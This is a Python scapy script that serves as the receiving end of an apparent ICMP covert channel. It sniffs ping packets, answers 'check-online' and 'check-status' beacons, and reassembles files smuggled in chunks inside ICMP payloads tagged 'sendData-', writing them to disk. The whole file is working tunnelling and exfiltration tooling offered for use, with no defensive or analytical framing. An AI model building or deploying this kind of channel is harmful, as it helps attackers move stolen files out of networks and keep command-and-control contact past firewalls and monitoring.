from scapy.all import IP, ICMP, Raw, send, get_if_addr, sniff,conf
import sys
import codecs
import binascii
DevIp = get_if_addr(conf.iface)
last_update_pubkey = 0x0009

data_to_write = {

}

def send_icmp(dst, payText, ImId=None, ImSq=None):
    #Encode the payload to hex format
    EncodedBytes = payText.encode()
    HexString = binascii.hexlify(EncodedBytes).decode()
    EscapedString = ''.join(['\\x'+HexString[i:i+2] for i in range(0, len(HexString), 2)])
    # Create a new ICMP Packet with a payload
    PacketResp = IP(dst=dst)/ICMP()/b'hello'
    # Modify the payload of the Packet
    PacketResp[Raw].load = bytes(EscapedString.encode('utf-8'))
    print(f'data: {payText}')
    if (ImId is None or ImSq is None):
        Response = send(PacketResp, verbose=0)
    else:
        PacketResp[ICMP].id = ImId
        PacketResp[ICMP].seq = ImSq
        send(PacketResp, verbose=0)


def send_public_key():
    pass

def handle_icmp(packet_data):
    
    try:
        escaped_string = packet_data[Raw].load
        plain_bytes = codecs.escape_decode(escaped_string)[0]
        if plain_bytes == b'check-status':
            print('start checking public key...')
            if packet_data[ICMP].id >= last_update_pubkey:
                send_icmp(packet_data[IP].src,'tls_Pub_ok')
            else:
                send_icmp(packet_data[IP].src,'tls_Pub_exp')
        elif plain_bytes == b'check-online':
            send_icmp(packet_data[IP].src, 'alive')
        elif plain_bytes.split(b'sendData-')[0] == b'':        
            if packet_data[ICMP].id == 0xffff:
                NameOfFile = plain_bytes.split(b'sendData-')[1].decode()
                data_to_write[NameOfFile] = {
                    'len': int(packet_data[ICMP].seq),
                    'data': {}
                }
            elif packet_data[ICMP].id == 61166:
                NameOfFile = plain_bytes.split(b'sendData-')[1].decode()
                if len(data_to_write[NameOfFile]['data']) == data_to_write[NameOfFile]['len']:
                    print('Data recv suc!!')
                    fileM = open(NameOfFile, "wb")
                    for i in data_to_write[NameOfFile]['data'].values():
                        fileM.write(i)
                    fileM.close()
                else:
                    print('Data didint recv correct')
            else:
                NameOfFile = plain_bytes.split(b'sendData-')[1].split(b'<tagMmd>')[0].decode()
                DataToWrite2 = plain_bytes.split(b'sendData-')[1].split(b'<tagMmd>')[1]
                chunk_id = packet_data[ICMP].id
                data_to_write[NameOfFile]['data'][chunk_id] = DataToWrite2
        else:
            print(packet_data[ICMP].id)
    except:
        pass

# Create a new sniffing thread to capture incoming ICMP packets
sniff(filter="icmp", prn=handle_icmp, store=0)